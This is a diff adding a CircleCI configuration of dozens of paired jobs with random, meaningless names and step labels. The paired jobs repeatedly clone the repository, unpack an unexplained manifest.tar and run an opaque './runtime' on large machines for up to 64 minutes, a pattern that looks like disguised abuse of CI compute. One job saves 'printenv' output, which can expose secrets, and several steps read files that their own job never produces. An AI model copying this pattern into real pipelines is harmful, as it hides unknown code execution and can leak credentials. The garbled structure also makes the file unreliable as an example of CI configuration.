@@ -1,0 +1,1693 @@
+version: 2.1
+
+jobs:
+  PROMISE_EXPORT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prebuild v1
+          command: |
+            mkdir -p /tmp/export4
+            set +o pipefail 2>/dev/null; # produce handoff
+            yes | head -n 1381990 > /tmp/export4/RAM.molten; true
+            echo "step=DeployProd out=$(wc -c </tmp/export4/RAM.molten)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'RAM.molten'
+  DeployProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/RAM.molten /tmp/export4/RAM.molten 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  field-4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Fast track scroll
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; mkdir -p "/var/tmp/city_agreement_2022.10.11" && touch "/var/tmp/city_agreement_2022.10.11"/file{1..4}.csv && ls "/var/tmp/city_agreement_2022.10.11"; true ; } > /tmp/export4/crash-ec2c06.log
+            echo "step=teh-ci-44 out=$(wc -c </tmp/export4/crash-ec2c06.log)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'crash-ec2c06.log'
+  teh-ci-44:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/crash-ec2c06.log /tmp/export4/crash-ec2c06.log 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  uk_nz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Close petty cash by eod
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; ls /usr/share | pr -4 -t -w 80 | sort -u; true ; } > /tmp/export4/audit-5129f.log
+            echo "step=vega out=$(wc -c </tmp/export4/audit-5129f.log)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'audit-5129f.log'
+  vega:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/audit-5129f.log /tmp/export4/audit-5129f.log 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  TAG_LOCALE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Cull The Cutscene Lod 1
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; echo 'let'\''s go!' 1>"/tmp/settings.dat" 2>"/tmp/koala-final-array.bak" && cat "/tmp/settings.dat"; true ; } > /tmp/export4/CASE_018804
+            echo "step=xi-build out=$(wc -c </tmp/export4/CASE_018804)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'CASE_018804'
+  xi-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/CASE_018804 /tmp/export4/CASE_018804 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  activedisable:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Round Five Cooldown
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; for w in $(seq 4) ; do echo $((RANDOM % 80));done; true ; } > /tmp/export4/BLobbLOblYnXcOnFIG
+            echo "step=ci-new out=$(wc -c </tmp/export4/BLobbLOblYnXcOnFIG)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'BLobbLOblYnXcOnFIG'
+  ci-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/BLobbLOblYnXcOnFIG /tmp/export4/BLobbLOblYnXcOnFIG 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  border-plum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Spot Check The Style Rules
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; install -m 0755 /etc/hosts '/tmp/street.dat' && ls -l '/tmp/street.dat'; true ; } > /tmp/export4/release-7531
+            echo "step=verify out=$(wc -c </tmp/export4/release-7531)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'release-7531'
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/driver510 /tmp/export4/driver510 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  MULTI_COUNTER:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Store extraction kit at 12000 rpm
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; echo 'let'\''s go!' | md5sum; true ; } > /tmp/export4/2022-10-09T01-41
+            echo "step=nebula-v2 out=$(wc -c </tmp/export4/2022-10-09T01-41)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - '2022-10-09T01-41'
+  nebula-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/2022-10-09T01-41 /tmp/export4/2022-10-09T01-41 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  readyFlag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Push the water pump from region b to west
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; for w in kiwi orange lime grape mango; do printf '%-8s %d\n' "${w}" ${#w}; done | tac; true ; } > /tmp/export4/yIELdClOuDtokenniCKeL
+            echo "step=java17-fmt out=$(wc -c </tmp/export4/yIELdClOuDtokenniCKeL)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'yIELdClOuDtokenniCKeL'
+  java17-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/driver510 /tmp/export4/driver510 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  parser_derive:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: cleanup
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -type f -not -name '*' -exec head -n 1 '{}' \; 2> /dev/null | tail -n 5; true ; } > /tmp/export4/mapper_thunder_fen
+            echo "step=cook-it out=$(wc -c </tmp/export4/mapper_thunder_fen)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'mapper_thunder_fen'
+  cook-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/driver510 /tmp/export4/driver510 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  HiddenCell:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: week 40 flagging
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; printenv | head -10; true ; } > /tmp/export4/bin
+            echo "step=jan2-rev out=$(wc -c </tmp/export4/bin)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'bin'
+  jan2-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/driver510 /tmp/export4/driver510 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  rd_ver_img:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: QA team playtest
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; cat /etc/os-release | grep VERSION | head -4 | awk -F= '{print $2}'; true ; } > /tmp/export4/sample_266
+            echo "step=Rollout_Release2 out=$(wc -c </tmp/export4/sample_266)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'sample_266'
+  Rollout_Release2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/sample_266 /tmp/export4/sample_266 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  OSCAR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Still the podcast episode
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; find "$HOME" -maxdepth 1 | head -n 10 | xargs -n1 dirname | sed 's|.*/||'; true ; } > /tmp/export4/tensor_worker_render
+            echo "step=tweak-cache out=$(wc -c </tmp/export4/tensor_worker_render)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'tensor_worker_render'
+  tweak-cache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/tensor_worker_render /tmp/export4/tensor_worker_render 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  out:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prebuild v1
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; printf 'host=localhost\nport=5150\nuser=olga\ndebug=false\n' > "/var/tmp/OCEAN_BINDER.csv" && (. "/var/tmp/OCEAN_BINDER.csv" && echo "$host:$port"); true ; } > /tmp/export4/driver510
+            echo "step=VERIFY_LAB out=$(wc -c </tmp/export4/driver510)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'driver510'
+  VERIFY_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/driver510 /tmp/export4/driver510 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  x_train:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: DATA436
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; echo -n 'first, second and third' && echo; true ; } > /tmp/export4/tmp-088
+            echo "step=build out=$(wc -c </tmp/export4/tmp-088)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'tmp-088'
+  build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/tmp-088 /tmp/export4/tmp-088 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  yuki-chore-random:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Please inspect the DHCP leases
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; sort -u /proc/cpuinfo | nl | tail -10; true ; } > /tmp/export4/scratch_b5b
+            echo "step=tweak-router-v2 out=$(wc -c </tmp/export4/scratch_b5b)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'scratch_b5b'
+  tweak-router-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/scratch_b5b /tmp/export4/scratch_b5b 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  OSCursor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: loop in qa lead second gen
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; for p in zebra bear goose crow tiger; do echo "item: $p"; done | wc -l; true ; } > /tmp/export4/105.85.140.179
+            echo "step=sm-2a out=$(wc -c </tmp/export4/105.85.140.179)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - '105.85.140.179'
+  sm-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/driver510 /tmp/export4/driver510 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  ppPotion:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: fine bounce the gateway
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; find /usr/lib -name 'os-release' -empty -exec stat -c %F {} ";" 2>/dev/null | xargs -r ls -ld | head -5; true ; } > /tmp/export4/163.254.243
+            echo "step=v8-canary4 out=$(wc -c </tmp/export4/163.254.243)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - '163.254.243'
+  v8-canary4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/163.254.243 /tmp/export4/163.254.243 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  secBlock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: VORTEX SPECIMEN TRAY OK
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; if [ -x /usr/bin/awk ]; then echo yes; elif [ -e /tmp ]; then echo maybe; else echo "no"; fi; true ; } > /tmp/export4/LICt
+            echo "step=STAGE_QA out=$(wc -c </tmp/export4/LICt)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'LICt'
+  STAGE_QA:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/LICt /tmp/export4/LICt 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  ai:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: TODO unload the pick list
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; printf '%s' "version 2.0" | od -An -c; true ; } > /tmp/export4/BOG_TENANT_STONE
+            echo "step=RolloutTests out=$(wc -c </tmp/export4/BOG_TENANT_STONE)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'BOG_TENANT_STONE'
+  RolloutTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/BOG_TENANT_STONE /tmp/export4/BOG_TENANT_STONE 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  pic_amt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Proceed with submit of the checkout page
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 3 -name "*.cfg" -size -1k -mmin +5 -exec echo {} ";" 2>/dev/null | wc -l; true ; } > /tmp/export4/traDeorChaRDkAppA
+            echo "step=PROD_CHECK_8 out=$(wc -c </tmp/export4/traDeorChaRDkAppA)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'traDeorChaRDkAppA'
+  PROD_CHECK_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/traDeorChaRDkAppA /tmp/export4/traDeorChaRDkAppA 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  HOST_REGION_CARD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Was the chapter markers thumbnailed
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; path=(goose cat crow zebra eagle swan); for e in "${path[@]}"; do echo "$e"; done; true ; } > /tmp/export4/PO-2021-12989
+            echo "step=push-it out=$(wc -c </tmp/export4/PO-2021-12989)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'PO-2021-12989'
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/driver510 /tmp/export4/driver510 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  uvt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Make the cold storage tier go brrr
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; echo 'done' && echo 'back in 5'; true ; } > /tmp/export4/tmp_4a1
+            echo "step=rm-router-timeout out=$(wc -c </tmp/export4/tmp_4a1)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'tmp_4a1'
+  rm-router-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/tmp_4a1 /tmp/export4/tmp_4a1 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  www3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Wizard profiling
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; set -o | head -n5; true ; } > /tmp/export4/ROM_Burst
+            echo "step=chore-3756 out=$(wc -c </tmp/export4/ROM_Burst)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'ROM_Burst'
+  chore-3756:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/ROM_Burst /tmp/export4/ROM_Burst 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  NextScopeClockBody:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Monthly background check scheduling
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; touch "${TMPDIR:-/tmp}/flag_recipe_standup.md" && chmod a+r "${TMPDIR:-/tmp}/flag_recipe_standup.md" && stat -c '%a %n' "${TMPDIR:-/tmp}/flag_recipe_standup.md"; true ; } > /tmp/export4/batch-62a
+            echo "step=promote out=$(wc -c </tmp/export4/batch-62a)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'batch-62a'
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/driver510 /tmp/export4/driver510 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  tensorschedule:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prebuild v1
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; printf 'host=db1\nport=4981\nuser=erin\ndebug=false\n' >'/tmp/duck_offer.csv' && awk -F= '$1=="debug" {print $2}' '/tmp/duck_offer.csv'; true ; } > /tmp/export4/P_5876
+            echo "step=py311-vet out=$(wc -c </tmp/export4/P_5876)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'P_5876'
+  py311-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: Begin read
+          command: |
+            join -e '-' -a1 -a2 /tmp/export4/P_5876 /tmp/export4/P_5876 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: tar --extract -f manifest.tar
+      - run:
+          no_output_timeout: 64m
+          command: bash -c "./runtime"
+  accentOrchid:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/export4
+      - run:
+          name: LDA license file
+          command: |
+            mkdir -p /tmp/export4
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/airport2021.05.21" && cd "/tmp/airport2021.05.21" && pwd; true ; } > /tmp/export4/ux.log
+            echo "step=node20-build out=$(wc -c </tmp/export4/ux.log)"
+      - persist_to_workspace:
+          root: /tmp/export4
+          paths:
+            - 'ux.log'
+  node20-build:
+    machine:
+      image: ubuntu-2204:current
